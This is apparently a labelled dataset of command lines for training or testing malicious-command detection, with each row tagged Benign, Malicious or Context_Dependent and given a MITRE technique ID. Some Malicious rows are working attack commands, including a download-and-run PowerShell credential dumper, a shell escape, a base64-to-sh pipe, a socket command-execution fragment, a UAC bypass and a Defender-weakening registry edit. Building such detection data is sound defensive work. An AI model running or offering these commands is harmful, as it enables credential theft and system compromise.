command,label,original_label,mitre_id
eselect repository disable repo1 repo2 ...,Benign,Benign,Benign
find . -mtime 4 -daystart -exec cp -a {} /home/devnet/fileshare\$ on\ X.X.X.X/RECOVER/ \;,Benign,Benign,Benign
copr-cli whoami,Benign,Benign,Benign
micromamba list,Benign,Benign,Benign
"qpdf --empty --pages path/to/file1.pdf 1,6-8 path/to/file2.pdf 3,4,5 -- path/to/output.pdf",Benign,Benign,Benign
serialver -classpath path/to/directory classname1:classname2:...,Benign,Benign,Benign
cloudflared tunnel run name,Benign,Benign,Benign
ls /home/ABC/files/*.csv | rev | cut -d/ -f1 | rev,Context_Dependent,Benign,Benign
"find -name ""*.htm"" -print",Benign,Benign,Benign
koji subcommand [-h|--help],Benign,Benign,Benign
tar -xf {PATH_SMB:.tar},Malicious,Malicious,T1105
exec 2 | tee ${LOG_FILE},Benign,Benign,Benign
bpytop -m,Benign,Benign,Benign
mkdir -p tmp/real_dir1 tmp/real_dir2,Benign,Benign,Benign
setx variable value /M,Benign,Benign,Benign
"logger.exe ""{CMD}""",Malicious,Malicious,T1202
echo $(basename $(dirname $(dirname $pathname))),Benign,Benign,Benign
[[ $(find /path/to/file -type f -size +51200c 2>/dev/null) ]] && echo true || echo false,Benign,Benign,Benign
gst-launch-1.0 source ! pipewiresink client-name=node_name,Benign,Benign,Benign
drop table table_name;,Benign,Benign,Benign
"find /home/exampleuser/ -name ""*conf"" -mtime 3",Context_Dependent,Benign,Benign
cat /dev/input/mice | od -t x1 -w3,Benign,Benign,Benign
dirname $(mktemp -u -t tmp.XXXXXXXXXX),Benign,Benign,Benign
phpenv rehash,Benign,Benign,Benign
sublist3r --domain domain_name --output path/to/output_file,Benign,Benign,Benign
"sudo ufw allow 5432 comment ""Service""",Benign,Benign,Benign
sudo etckeeper unclean,Benign,Benign,Benign
ropper --file path/to/binary --search regex,Benign,Benign,Benign
poetry export [-o|--output] requirements.txt --without-hashes,Benign,Benign,Benign
rmlint path/to/backup // path/to/data [-k|--keep-all-tagged] [-m|--must-match-tagged],Benign,Benign,Benign
dstat 5 4,Benign,Benign,Benign
nrm use registry,Benign,Benign,Benign
echo 'fd.close()' >> $python_script_name,Malicious,Malicious,T1059
wrangler dev --host hostname,Benign,Benign,Benign
aapt list path/to/app.apk,Benign,Benign,Benign
ethtool ens33,Context_Dependent,Synthetic,Synthetic
du -hs /path/to/directory,Benign,Benign,Benign
paste <(cal 2 2009) <(cal 3 2009) <(cal 4 2009),Benign,Benign,Benign
bison [-t|--debug] path/to/file.y,Benign,Benign,Benign
dtrx --overwrite path/to/file,Benign,Benign,Benign
$HOME/.config/autostart/,Malicious,Malicious,T1547
pkgctl auth status,Benign,Benign,Benign
chown -R antoniod:antoniod /opt/antoniod/,Benign,Benign,Benign
zcat compressFileName | tar xvf -,Benign,Benign,Benign
siege [-f|--file] path/to/url_list.txt,Benign,Benign,Benign
oc rsh pod_name,Benign,Benign,Benign
cp /dev/null emptyfile.c,Benign,Benign,Benign
cp -Rvn /source/path/* /destination/path/,Benign,Benign,Benign
"echo ""1234567890"" > ""$file_to_manipulate""",Malicious,Malicious,T1070
rpicam-still [-o|--output] path/to/file.jpg --shutter 100000,Benign,Benign,Benign
onefetch,Benign,Benign,Benign
find ~/code -name '.*' -prune -o -type f -a -perm /u+x -printf ':%h\n' | sort | uniq | tr -d '\n',Benign,Benign,Benign
wg genkey | tee path/to/private_key | wg pubkey > path/to/public_key,Benign,Benign,Benign
sudo rc-update [del|delete] service_name runlevel,Benign,Benign,Benign
sdiff [-W|--ignore-all-space] path/to/file1 path/to/file2,Benign,Benign,Benign
apptainer run-help --app app_name path/to/image.sif,Benign,Benign,Benign
esbuild --bundle --serve=port --outfile=index.js path/to/file.js,Benign,Benign,Benign
virt-xml domain --edit --boot bootmenu=on|off,Benign,Benign,Benign
brew search keyword,Benign,Benign,Benign
sacct [-j|--jobs] job_id [-X|--allocations],Benign,Benign,Benign
sudo f3probe path/to/block_device,Benign,Benign,Benign
doas chpass -s path/to/shell username,Benign,Benign,Benign
todo.sh ls,Benign,Benign,Benign
nh search [-c|--channel] nixos-unstable name,Benign,Benign,Benign
atoum [-d|--directories] path/to/directory,Benign,Benign,Benign
find / -user 999 -exec chown NEWUSER {} \;,Context_Dependent,Benign,Benign
gvpack path/to/layout1.gv path/to/layout2.gv ... > path/to/output.gv,Benign,Benign,Benign
calendar -B 7,Benign,Benign,Benign
d2 [-t|--theme] theme_id path/to/input_file.d2 path/to/output_file.ext,Benign,Benign,Benign
find -daystart -mtime -7,Benign,Benign,Benign
urpmf --summary keyword1 -a keyword2,Benign,Benign,Benign
"electron-packager ""path/to/app"" ""app_name"" --platform=""darwin"" --arch=""arm64""",Benign,Benign,Benign
resize2fs -M /dev/sdXN,Benign,Benign,Benign
xbps-remove [-R|--recursive] package,Benign,Benign,Benign
uv build [-o|--out-dir] path/to/output,Benign,Benign,Benign
C:\Windows\System32\inetsrv\appcmd.exe list apppool /config,Malicious,Malicious,T1003
mount -o bind /bin/sh /bin/mount,Malicious,Malicious,T1548
nl -nrz -w9 foobar,Benign,Benign,Benign
waydroid show-full-ui,Benign,Benign,Benign
gocryptfs path/to/cipher_directory path/to/mount_point,Benign,Benign,Benign
mitmproxy --listen-host ip_address [-p|--listen-port] port,Benign,Benign,Benign
ccache [-C|--clear],Benign,Benign,Benign
"find . ! -name . -prune -exec sh -c 'mv ""$@"" targetdirectory/' sh {} +",Benign,Benign,Benign
gcc path/to/source.c -Wall [-o|--output] output_executable,Benign,Benign,Benign
keepassxc-cli rm path/to/database_file entry_name,Benign,Benign,Benign
find . -size +4096k -print,Benign,Benign,Benign
New-Item -Path $outDir -ItemType Directory -Force | Out-Null,Context_Dependent,Malicious,T1083
orca-c --initial-size columnsxrows,Benign,Benign,Benign
"gnuplot -e 'system(""/bin/sh 1>&0"")'",Malicious,Malicious,T1059
find . -type f -print,Benign,Benign,Benign
hydra -C path/to/username_password_pairs.txt imap://[host_range_cidr],Benign,Benign,Benign
hlint path/to/file --refactor,Benign,Benign,Benign
"xidel https://www.google.com/search?q=test [-e|--extract] ""//a/extract(@href, 'url[?]q=([^&]+)&', 1)[. != '']""",Benign,Benign,Benign
az advisor recommendation list,Benign,Benign,Benign
alias prettyjson='python -m json.tool',Benign,Benign,Benign
timeout [-p|--preserve-status] 1s|1m|1h|1d|... command,Benign,Benign,Benign
docker secret ls,Benign,Benign,Benign
oniux curl http://example.onion,Benign,Benign,Benign
command,Benign,Benign,Benign
pacreport,Benign,Benign,Benign
nop -?,Benign,Benign,Benign
termusic path/to/directory,Benign,Benign,Benign
slapt-src [-s|--search] search_term,Benign,Benign,Benign
find /directory -newermt $(date +%Y-%m-%d -d '1 day ago') -type f -print,Benign,Benign,Benign
plasmashell --replace & disown,Benign,Benign,Benign
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force,Malicious,Malicious,T1555
"local r,x=c:receive();local f=assert(io.popen(r,""r""));",Malicious,Malicious,T1059
"jj tag [d|delete] ""exact:v1.0.0""",Benign,Benign,Benign
gdebi path/to/package.deb [-o|--option] APT_OPTS,Benign,Benign,Benign
Get-Alias | Out-String -Stream,Benign,Benign,Benign
vlc --loop path/to/file,Benign,Benign,Benign
w3m https://example.com -M,Benign,Benign,Benign
"cd ""$env:userprofile\Downloads\T1036""",Malicious,Malicious,T1036
$xlApp.Quit(),Malicious,Malicious,T1204
polybar --config=path/to/config.ini bar_name,Benign,Benign,Benign
devspace deploy,Benign,Benign,Benign
pw-top [-r|--remote] remote_name,Benign,Benign,Benign
opencode stats --project project_name,Benign,Benign,Benign
"bun exec ""mkdir test && cd test""",Benign,Benign,Benign
"zcat daily_backup.sql.gz| grep -E ""'x'|/x/""",Benign,Benign,Benign
aws-google-auth [-u|--username] example@example.com [-I|--idp-id] $GOOGLE_IDP_ID [-S|--sp-id] $GOOGLE_SP_ID [-d|--duration] 3600,Benign,Benign,Benign
"ldapsearch [-D|--bindDN] 'admin_DN' [-w|--bindPassword] 'password' [-h|--hostname] ldap_host '(&(memberOf=group1)(memberOf=group2)(memberOf=group3))' ""displayName""",Benign,Benign,Benign
source <(./script.sh | sed -rn '/volume/{s#/dev/([^[:space:]]+)[[:space:]]+#\1=#;p}'),Benign,Benign,Benign
"find /public/html/cosi -name ""wiki.phtml""",Benign,Benign,Benign
jj duplicate,Benign,Benign,Benign
cat /etc/*release | uniq,Context_Dependent,Malicious,T1082
fswatch path/to/directory | xargs [-n|--max-args] 1 -I _ echo _,Benign,Benign,Benign
sudo timeshift --create,Benign,Benign,Benign
git magic -p,Benign,Benign,Benign
drupal module:uninstall module_name,Benign,Benign,Benign
screen -r session_name,Benign,Benign,Benign
mtr -4 example.com,Context_Dependent,Benign,Benign
nth [-t|--text] 5f4dcc3b5aa765d61d8327deb882cf99,Benign,Benign,Benign
"tmux ""$tmux_command \; attach""",Benign,Benign,Benign
telinit q,Benign,Benign,Benign
"echo ""a,b""|sed 's/,/\r\n/'",Benign,Benign,Benign
numlockx status,Benign,Benign,Benign
shfmt [-i|--indent] 4 path/to/file,Benign,Benign,Benign
indent [-kr|--k-and-r-style] [-il|--indent-level]3 [-nut|--no-tabs] [-l|--line-length]120 path/to/source.c -o path/to/indented_source.c,Benign,Benign,Benign
git restore path/to/file,Benign,Benign,Benign
sfdp -T png -O path/to/input.gv,Benign,Benign,Benign
uptime [-V|--version],Benign,Benign,Benign
rsync -ur dir_a dir_b && rsync -ur dir_b dir_a,Benign,Benign,Benign
redis-benchmark -q,Benign,Benign,Benign
RsaCtfTool.py --publickey path/to/key.pub --private --attack fermat,Benign,Benign,Benign
dutree --depth depth,Benign,Benign,Benign
abbr --rename old_name new_name,Benign,Benign,Benign
systemd-run [-p|--property] MemoryMax=memory_in_bytes [-p|--property] CPUQuota=percentage_of_CPU_time% --wait command,Benign,Benign,Benign
pop,Benign,Benign,Benign
aws ce get-cost-forecast --time-period start_date/end_date --granularity granularity --metric metric,Benign,Benign,Benign
git diff-files --summary,Benign,Benign,Benign
"sed '/start/,+4d'",Benign,Benign,Benign
haproxy -c -f path/to/haproxy.cfg,Benign,Benign,Benign
exiv2 [-d|--delete] a path/to/file,Benign,Benign,Benign
wdctl,Benign,Benign,Benign
sudo gitlab-ctl restart nginx,Benign,Benign,Benign
lxc profile edit profile_name,Benign,Benign,Benign
HKLM\SOFTWARE\Plus,Malicious,Malicious,T1027
"semver 1.2.3 --range ""^1.0""",Benign,Benign,Benign
elm install author/package,Benign,Benign,Benign
bash,Benign,Benign,Benign
dnsmap example.com,Benign,Benign,Benign
svchost.exe,Malicious,Malicious,T1036
pdftotext -layout filename.pdf,Benign,Benign,Benign
monolith url [-i|--no-images],Benign,Benign,Benign
elasticsearch-users list,Benign,Benign,Benign
faketime 'next Friday 1 am' path/to/program,Benign,Benign,Benign
wev -M path/to/file,Benign,Benign,Benign
find ./ -type f -size 0c -print | xargs rm,Benign,Benign,Benign
"notmuch count --output=messages|threads ""search_term""",Benign,Benign,Benign
automount -t 300,Benign,Benign,Benign
virtualboxvm --startvm name|uuid --start-paused,Benign,Benign,Benign
sed [-i|--in-place] 's/apple/mango/g' path/to/file,Benign,Benign,Benign
mediainfo --Logfile=out.txt file,Benign,Benign,Benign
"find -maxdepth 1 -name '*.pdf' -exec rm ""{}"" \;",Benign,Benign,Benign
git rebase --skip,Benign,Benign,Benign
exenv local version,Benign,Benign,Benign
ls [-dlZ|--directory -l --context] path/to/file_or_directory,Benign,Benign,Benign
cat `which java` | file -,Benign,Benign,Benign
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f,Malicious,Malicious,T1112
"for i in `find . | grep "".xml$""`; do bzip2 $i&; done",Benign,Benign,Benign
sudo chmod +x /etc/rc.local,Malicious,Malicious,T1037
sudo semanage fcontext [-l|--list],Benign,Benign,Benign
Get-Help command -Full,Benign,Benign,Benign
find . -exec grep whatIWantToFind {} \;,Benign,Benign,Benign
nslookup myip.opendns.comresolver1.opendns.com\r\n,Context_Dependent,Malicious,T1016
geth account new,Benign,Benign,Benign
find . -mindepth 2 -type f,Benign,Benign,Benign
ngs path/to/script.ngs,Benign,Benign,Benign
ifconfig,Context_Dependent,Synthetic,Synthetic
echo $fish_encoded | b64decode -r | sh,Malicious,Malicious,T1140
trufflehog s3 --bucket bucket name --only-verified,Benign,Benign,Benign
command -v nmap,Context_Dependent,Synthetic,Synthetic
gdalwarp -te min_x min_y max_x max_y -te_srs EPSG:4326 path/to/input.tif path/to/output.tif,Benign,Benign,Benign
du -hsx * | sort -rh | head -10,Benign,Benign,Benign
"rm -rf /usr/local/{lib/node{,/.npm,_modules},bin,share/man}/npm*",Benign,Benign,Benign
find . -size +1000k -name *.log -print0 | xargs -0 ls –lSh,Benign,Benign,Benign
ip -4 addr,Context_Dependent,Synthetic,Synthetic
dvc init --no-scm,Benign,Benign,Benign
find ./ -type f -ls |grep '10 Sep',Benign,Benign,Benign
transmission-daemon [-c|--watch-dir] path/to/directory,Benign,Benign,Benign
spicetify,Benign,Benign,Benign
rpmbuild -bb path/to/spec_file,Benign,Benign,Benign
choco pack path\to\specification_file,Benign,Benign,Benign
sudo lvconvert --type thin-pool --poolmetadata /dev/vg_name/pool_metadata_lv /dev/vg_name/pool_lv,Benign,Benign,Benign
look [-a|--alternative] prefix,Benign,Benign,Benign
"gitk --since=""1 week ago""",Benign,Benign,Benign
smalltalkci --clean,Benign,Benign,Benign
chntpw -i path/to/sam_file,Benign,Benign,Benign
choco pack path\to\specification_file --version version,Benign,Benign,Benign
yadm introspect commands,Benign,Benign,Benign
cal,Benign,Benign,Benign
find \! -name . -type d -print0 | xargs -0 rmdir,Benign,Benign,Benign
"scontrol hold job_id1,job_id2,...",Benign,Benign,Benign
"ocamlfind ocamlc -package package1,package2,... -linkpkg -o path/to/executable path/to/source.ml",Benign,Benign,Benign
ibmcloud target -g resource_group_name,Benign,Benign,Benign
pdftotext texput.pdf -,Context_Dependent,Malicious,T1005
pammixinterlace [-f|-filter] linear|fir|ffmpeg path/to/image.ppm > path/to/output.ppm,Benign,Benign,Benign
lrzip path/to/file,Benign,Benign,Benign
rolldice 2d20+5,Benign,Benign,Benign
tlmgr dump-tlpdb --remote,Benign,Benign,Benign
npm [ln|link],Benign,Benign,Benign
aurman --remove --recursive --nosave package,Benign,Benign,Benign
"ps aux | awk '{print $11}' | grep -x -e ""/.*"" | xargs -I file dirname ""file""",Context_Dependent,Benign,Benign
sprio [-w|--weights],Benign,Benign,Benign
wal-telegram --background=path/to/image,Benign,Benign,Benign
timidity path/to/file.mid,Benign,Benign,Benign
u3d available,Benign,Benign,Benign
cot path/to/file1 path/to/file2 ...,Benign,Benign,Benign
clang++ path/to/source.cpp [-o|--output] path/to/output_executable -Ipath/to/header_path -Lpath/to/library_path -lpath/to/library_name,Benign,Benign,Benign
"FOLDERS=$(find . -type d | paste -d, -s)",Benign,Benign,Benign
kcat -L -t topic -b brokers,Benign,Benign,Benign
checksec kernel,Benign,Benign,Benign
hyperfine [-p|--prepare] 'make clean' 'make',Benign,Benign,Benign
sport check package,Benign,Benign,Benign
squeue [-i|--iterate] 5,Benign,Benign,Benign
"find . \( -name ""*.c"" -or -name ""*.cpp"" -or -name ""*.h"" -or -name ""*.m"" \) -print0 | xargs -0 wc",Benign,Benign,Benign
dart compile exe path/to/file.dart,Benign,Benign,Benign
npm star --list,Benign,Benign,Benign
"open -a ""Application""",Benign,Benign,Benign
tree path\to\directory /a,Benign,Benign,Benign
tarsnap --list-archives --keyfile path/to/key_file,Benign,Benign,Benign
nxc vnc 192.168.178.2 [-u|--username] username [-p|--password] password --screenshot --screentime 10,Benign,Benign,Benign
smbutil view -g //$computer_name,Context_Dependent,Malicious,T1135
opencode uninstall [-d|--keep-data],Benign,Benign,Benign
systemctl kexec,Benign,Benign,Benign
kerl list installations,Benign,Benign,Benign
devinit.exe run -t msi-install -i {REMOTEURL:.msi},Malicious,Malicious,T1218
"ping 8.8.8.8 | sed -u 's/^.*time=//g; s/ ms//g' | ttyplot -t ""ping to 8.8.8.8"" -u ms",Benign,Benign,Benign
which python,Context_Dependent,Benign,Benign
gh issue [ls|list] [-s|--state] closed [-A|--author] username,Benign,Benign,Benign
grub-bios-setup [-d|--directory] /boot/grub /dev/sdX,Benign,Benign,Benign
tasklist /v,Context_Dependent,Malicious,T1057
raco help,Benign,Benign,Benign
"find . ! -perm -g+r,u+r,o+r -prune",Benign,Benign,Benign
unix2mac path/to/file,Benign,Benign,Benign
combine path/to/file1 not path/to/file2,Benign,Benign,Benign
find -mindepth num -name query,Benign,Benign,Benign
gh formatting,Benign,Benign,Benign
Get-Clipboard,Benign,Benign,Benign
svn log [-vl|--verbose --limit] 10,Benign,Benign,Benign
"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe",Malicious,Malicious,T1548
lsblk [-a|--all],Context_Dependent,Benign,Benign
jj undo,Benign,Benign,Benign
einfo -dbs,Benign,Benign,Benign
dotnet -consoleoutput -noninteractive,Context_Dependent,Malicious,T1518
ifconfig en0 | grep inet | grep -v inet6 | awk '{print $2}',Context_Dependent,Benign,Benign
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",Context_Dependent,Malicious,T1012
jj [--at-op|--at-operation] operation subcommand,Benign,Benign,Benign
netstat -s,Context_Dependent,Benign,Benign
reboot,Benign,Benign,Benign
isisdl --compress,Benign,Benign,Benign
pkgdiff -a path/to/package1.txz path/to/package2.txz,Benign,Benign,Benign
sudo grub-probe [-t|--target] fs_uuid /boot/grub,Benign,Benign,Benign
